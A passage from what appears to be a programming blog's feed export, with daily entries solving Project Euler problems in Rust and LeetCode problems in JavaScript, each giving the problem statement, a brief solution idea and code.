class="keyword">if</span>(s.charAt(i)==<span class="string">")"</span>)&#123;</span><br><span class="line">      l -= <span class="number">1</span>;</span><br><span class="line">      h -= <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      l -= <span class="number">1</span>;</span><br><span class="line">      h += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(h &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    l = <span class="built_in">Math</span>.max(lo, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> l == <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-06 Daily Challenge</title>
      <link href="/2019-01-06-Daily-Challenge/"/>
      <url>/2019-01-06-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Number letter counts</em> in <em>Rust</em> and <em>Reverse String</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Number letter counts</span><br><span class="line"></span><br><span class="line">Problem 17 </span><br><span class="line"></span><br><span class="line">If the numbers 1 to 5 are written out in words: one, two, three, four, five, then there are 3 + 3 + 5 + 4 + 4 = 19 letters used in total.</span><br><span class="line"></span><br><span class="line">If all the numbers from 1 to 1000 (one thousand) inclusive were written out in words, how many letters would be used?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTE: Do not count spaces or hyphens. For example, 342 (three hundred and forty-two) contains 23 letters and 115 (one hundred and fifteen) contains 20 letters. The use of &quot;and&quot; when writing out numbers is in compliance with British usage.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Emmmm, carefully simulation.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">assert!</span>(nlc(<span class="number">342</span>) == <span class="number">23</span>);</span><br><span class="line">    <span class="built_in">assert!</span>(nlc(<span class="number">115</span>) == <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">assert!</span>(nlc(<span class="number">1</span>)+nlc(<span class="number">2</span>)+nlc(<span class="number">3</span>)+nlc(<span class="number">4</span>)+nlc(<span class="number">5</span>) == <span class="number">19</span>);</span><br><span class="line">    <span class="built_in">assert!</span>(nlc(<span class="number">900</span>) == <span class="number">11</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i32</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">1001</span> &#123;</span><br><span class="line">        ans += nlc(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nlc means Number Letter Count</span></span><br><span class="line"><span class="comment">// only apply to positive number and less  than 1e9 + 1</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">nlc</span></span>(n: <span class="built_in">i32</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">match</span> n &#123;</span><br><span class="line">        <span class="comment">// one, two, six, ten</span></span><br><span class="line">        <span class="number">1</span> | <span class="number">2</span> | <span class="number">6</span> | <span class="number">10</span> =&gt; <span class="keyword">return</span> <span class="number">3</span>,</span><br><span class="line">        <span class="comment">// zero, four, five, nine</span></span><br><span class="line">        <span class="number">0</span> | <span class="number">4</span> | <span class="number">5</span> | <span class="number">9</span> =&gt; <span class="keyword">return</span> <span class="number">4</span>,</span><br><span class="line">        <span class="comment">// three, seven, eight, forty, fifty, sixty</span></span><br><span class="line">        <span class="number">3</span> | <span class="number">7</span> | <span class="number">8</span> | <span class="number">40</span> | <span class="number">50</span> | <span class="number">60</span> =&gt; <span class="keyword">return</span> <span class="number">5</span>,</span><br><span class="line">        <span class="comment">// eleven, twelve, twenty, thirty, eighty, ninety</span></span><br><span class="line">        <span class="number">11</span> | <span class="number">12</span> | <span class="number">20</span> | <span class="number">30</span> | <span class="number">80</span> | <span class="number">90</span> =&gt; <span class="keyword">return</span> <span class="number">6</span>,</span><br><span class="line">        <span class="comment">// fifteen, sixteen, seventy</span></span><br><span class="line">        <span class="number">15</span> | <span class="number">16</span> | <span class="number">70</span> =&gt; <span class="keyword">return</span> <span class="number">7</span>,</span><br><span class="line">        <span class="comment">// thirteen, fourteen, eighteen, nineteen</span></span><br><span class="line">        <span class="number">13</span> | <span class="number">14</span> | <span class="number">18</span> | <span class="number">19</span> =&gt; <span class="keyword">return</span> <span class="number">8</span>,</span><br><span class="line">        <span class="comment">// seventeen</span></span><br><span class="line">        <span class="number">17</span> =&gt; <span class="keyword">return</span> <span class="number">9</span>,</span><br><span class="line">        <span class="comment">// one million, one billion</span></span><br><span class="line">        <span class="number">1_000_000</span> | <span class="number">1_000_000_000</span> =&gt; <span class="keyword">return</span> <span class="number">10</span>,</span><br><span class="line">        <span class="comment">// one thouand</span></span><br><span class="line">        <span class="number">1000</span> =&gt; <span class="keyword">return</span> <span class="number">11</span>,</span><br><span class="line">        <span class="comment">// (\d)0 but not 10</span></span><br><span class="line">        n <span class="keyword">if</span> n &gt; <span class="number">20</span> &amp;&amp; n &lt; <span class="number">100</span> =&gt; <span class="keyword">return</span> nlc(n-n%<span class="number">10</span>) + nlc(n%<span class="number">10</span>),</span><br><span class="line">        <span class="comment">// (\d)00</span></span><br><span class="line">        <span class="comment">// &#123;&#125; hundred</span></span><br><span class="line">        n <span class="keyword">if</span> n &gt; <span class="number">99</span> &amp;&amp; n &lt; <span class="number">1000</span> &amp;&amp; n % <span class="number">100</span> == <span class="number">0</span> =&gt; <span class="keyword">return</span> nlc(n/<span class="number">100</span>) + <span class="number">7</span>,</span><br><span class="line">        <span class="comment">// 101..999 but not 100/200..</span></span><br><span class="line">        <span class="comment">// &#123;&#125; hundred and &#123;&#125;</span></span><br><span class="line">        n <span class="keyword">if</span> n &gt; <span class="number">100</span> &amp;&amp; n &lt; <span class="number">1000</span> =&gt; <span class="keyword">return</span> nlc(n/<span class="number">100</span>) + <span class="number">7</span> + <span class="number">3</span> + nlc(n%<span class="number">100</span>),</span><br><span class="line">        <span class="comment">// (\d)000</span></span><br><span class="line">        n <span class="keyword">if</span> n &gt; <span class="number">999</span> &amp;&amp; n &lt; <span class="number">1000000</span> &amp;&amp; n % <span class="number">1000</span> == <span class="number">0</span> =&gt; <span class="keyword">return</span> nlc(n/<span class="number">1000</span>) + <span class="number">8</span>,</span><br><span class="line">        <span class="comment">// 1001..999999</span></span><br><span class="line">        <span class="comment">// &#123;&#125; thousand &#123;&#125; hundred and &#123;&#125;</span></span><br><span class="line">        n <span class="keyword">if</span> n &gt; <span class="number">1000</span> &amp;&amp; n &lt; <span class="number">1_000_000</span> =&gt; <span class="keyword">return</span> nlc(n/<span class="number">1000</span>) + <span class="number">8</span> + nlc(n%<span class="number">1000</span>),</span><br><span class="line">        <span class="comment">// (\d)000000</span></span><br><span class="line">        n <span class="keyword">if</span> n &gt; <span class="number">999_999</span> &amp;&amp; n &lt; <span class="number">1_000_000_000</span> &amp;&amp; n % <span class="number">1_000_000</span> == <span class="number">0</span> =&gt; <span class="keyword">return</span> nlc(n/<span class="number">1_000_000</span>) + <span class="number">7</span>,</span><br><span class="line">        <span class="comment">// 1000001..999999999</span></span><br><span class="line">        <span class="comment">// &#123;&#125; million &#123;&#125; thousand &#123;&#125; hundred and &#123;&#125;</span></span><br><span class="line">        n <span class="keyword">if</span> n &gt; <span class="number">1_000_000</span> &amp;&amp; n &lt; <span class="number">1_000_000_000</span> =&gt; <span class="keyword">return</span> nlc(n/<span class="number">1_000_000</span>) + <span class="number">7</span> + nlc(n%<span class="number">1_000_000</span>),</span><br><span class="line">        <span class="comment">// -1 for error</span></span><br><span class="line">        _ =&gt; <span class="keyword">return</span> -<span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">344. Reverse String</span><br><span class="line"></span><br><span class="line">Write a function that takes a string as input and returns the string reversed.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: &quot;hello&quot;</span><br><span class="line">Output: &quot;olleh&quot;</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: &quot;A man, a plan, a canal: Panama&quot;</span><br><span class="line">Output: &quot;amanaP :lanac a ,nalp a ,nam A&quot;</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> reverseString = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> s.split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-05 Daily Challenge</title>
      <link href="/2019-01-05-Daily-Challenge/"/>
      <url>/2019-01-05-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Power digit sum</em> in <em>Rust</em> and <em>Swap Adjacent in LR String</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Power digit sum</span><br><span class="line"></span><br><span class="line">Problem 16 </span><br><span class="line"></span><br><span class="line">2^15 = 32768 and the sum of its digits is 3 + 2 + 7 + 6 + 8 = 26.</span><br><span class="line"></span><br><span class="line">What is the sum of the digits of the number 2^1000?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::&#123;BigInt&#125;;</span><br><span class="line"><span class="keyword">use</span> std::ops::Shl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num: BigInt = BigInt::from(<span class="number">1u32</span>);</span><br><span class="line">    num = num.shl(<span class="number">1000</span> <span class="keyword">as</span> <span class="built_in">usize</span>);</span><br><span class="line">    <span class="keyword">let</span> num = num.to_str_radix(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> MINES: <span class="built_in">i32</span> = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num.chars() &#123;</span><br><span class="line">        ans += (i <span class="keyword">as</span> <span class="built_in">i32</span>) - MINES;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">777. Swap Adjacent in LR String</span><br><span class="line"></span><br><span class="line">In a string composed of &apos;L&apos;, &apos;R&apos;, and &apos;X&apos; characters, like &quot;RXXLRXRXL&quot;, a move consists of either replacing one occurrence of &quot;XL&quot; with &quot;LX&quot;, or replacing one occurrence of &quot;RX&quot; with &quot;XR&quot;. Given the starting string start and the ending string end, return True if and only if there exists a sequence of moves to transform one string to the other.</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">Input: start = &quot;RXXLRXRXL&quot;, end = &quot;XRLXXRRLX&quot;</span><br><span class="line">Output: True</span><br><span class="line">Explanation:</span><br><span class="line">We can transform start to end following these steps:</span><br><span class="line">RXXLRXRXL -&gt;</span><br><span class="line">XRXLRXRXL -&gt;</span><br><span class="line">XRLXRXRXL -&gt;</span><br><span class="line">XRLXXRRXL -&gt;</span><br><span class="line">XRLXXRRLX</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">1 &lt;= len(start) = len(end) &lt;= 10000.</span><br><span class="line">Both start and end will only consist of characters in &#123;&apos;L&apos;, &apos;R&apos;, &apos;X&apos;&#125;.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>We could observe these pattern:</p><ul><li>Any one &quot;L&quot; and another &quot;R&quot; won&#39;t change their relative position.</li><li>Position of &quot;L&quot;s only can be more left, &quot;R&quot; only can be more right.</li></ul><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; start</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; end</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> canTransform = <span class="function"><span class="keyword">function</span>(<span class="params">start, end</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> fset = [];</span><br><span class="line">  <span class="keyword">let</span> fpos = [];</span><br><span class="line">  <span class="keyword">let</span> sset = [];</span><br><span class="line">  <span class="keyword">let</span> spos = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>, l = start.length; i &lt; l; ++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(start[i] != <span class="string">"X"</span>)&#123;</span><br><span class="line">      fset.push(start[i]);</span><br><span class="line">      fpos.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>, l = start.length; i &lt; l; ++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(end[i] != <span class="string">"X"</span>)&#123;</span><br><span class="line">      sset.push(end[i]);</span><br><span class="line">      spos.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(fset.length != sset.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>, l = fset.length; i &lt; l; ++i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(fset[i] != sset[i]||</span><br><span class="line">      (fset[i] == <span class="string">"L"</span> &amp;&amp; fpos[i] &lt; spos[i])||</span><br><span class="line">      (fset[i] == <span class="string">"R"</span> &amp;&amp; fpos[i] &gt; spos[i]))&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-04 Daily Challenge</title>
      <link href="/2019-01-04-Daily-Challenge/"/>
      <url>/2019-01-04-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Lattice paths</em> in <em>Rust</em> and <em>Robot Return to Origin</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Lattice paths</span><br><span class="line"></span><br><span class="line">Problem 15 </span><br><span class="line"></span><br><span class="line">Starting in the top left corner of a 2×2 grid, and only being able to move to the right and down, there are exactly 6 routes to the bottom right corner.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">How many such routes are there through a 20×20 grid?</span><br></pre></td></tr></table></figure><p><img src="https://projecteuler.net/project/images/p015.gif" alt="img"></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>To a $n*n$ grid, the answer is $C_{2n}^{n}$.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_traits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::&#123;BigUint&#125;;</span><br><span class="line"><span class="keyword">use</span> num_traits::&#123;One&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> f1: BigUint = One::one();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">21u32</span>..<span class="number">41u32</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> f2 = BigUint::from(i);</span><br><span class="line">        f1 = f1 * &amp;f2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1u32</span>..<span class="number">21u32</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> f2 = BigUint::from(i);</span><br><span class="line">        f1 = f1 / &amp;f2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, f1.to_str_radix(<span class="number">10</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">657. Robot Return to Origin</span><br><span class="line"></span><br><span class="line">There is a robot starting at position (0, 0), the origin, on a 2D plane. Given a sequence of its moves, judge if this robot ends up at (0, 0) after it completes its moves.</span><br><span class="line"></span><br><span class="line">The move sequence is represented by a string, and the character moves[i] represents its ith move. Valid moves are R (right), L (left), U (up), and D (down). If the robot returns to the origin after it finishes all of its moves, return true. Otherwise, return false.</span><br><span class="line"></span><br><span class="line">Note: The way that the robot is &quot;facing&quot; is irrelevant. &quot;R&quot; will always make the robot move to the right once, &quot;L&quot; will always make it move left, etc. Also, assume that the magnitude of the robot&apos;s movement is the same for each move.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: &quot;UD&quot;</span><br><span class="line">Output: true </span><br><span class="line">Explanation: The robot moves up once, and then down once. All moves have the same magnitude, so it ended up at the origin where it started. Therefore, we return true.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: &quot;LL&quot;</span><br><span class="line">Output: false</span><br><span class="line">Explanation: The robot moves left twice. It ends up two &quot;moves&quot; to the left of the origin. We return false because it is not at the origin at the end of its moves.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implemtation"><a href="#Implemtation" class="headerlink" title="Implemtation"></a>Implemtation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; moves</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> judgeCircle = <span class="function"><span class="keyword">function</span>(<span class="params">moves</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> up = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> left = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> i <span class="keyword">of</span> moves)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i === <span class="string">"L"</span>) left++;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i === <span class="string">"R"</span>) left--;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i === <span class="string">"U"</span>) up++;</span><br><span class="line">    <span class="keyword">else</span> up--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> up==left&amp;&amp;up==<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-03 Daily Challenge</title>
      <link href="/2019-01-03-Daily-Challenge/"/>
      <url>/2019-01-03-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Longest Collatz sequence</em> in <em>Rust</em> and <em>Permutation Sequence</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Longest Collatz sequence</span><br><span class="line"></span><br><span class="line">Problem 14 </span><br><span class="line"></span><br><span class="line">The following iterative sequence is defined for the set of positive integers:</span><br><span class="line"></span><br><span class="line">n → n/2 (n is even)</span><br><span class="line">n → 3n + 1 (n is odd)</span><br><span class="line"></span><br><span class="line">Using the rule above and starting with 13, we generate the following sequence:</span><br><span class="line"></span><br><span class="line">13 → 40 → 20 → 10 → 5 → 16 → 8 → 4 → 2 → 1</span><br><span class="line">It can be seen that this sequence (starting at 13 and finishing at 1) contains 10 terms. Although it has not been proved yet (Collatz Problem), it is thought that all starting numbers finish at 1.</span><br><span class="line"></span><br><span class="line">Which starting number, under one million, produces the longest chain?</span><br><span class="line"></span><br><span class="line">NOTE: Once the chain starts the terms are allowed to go above one 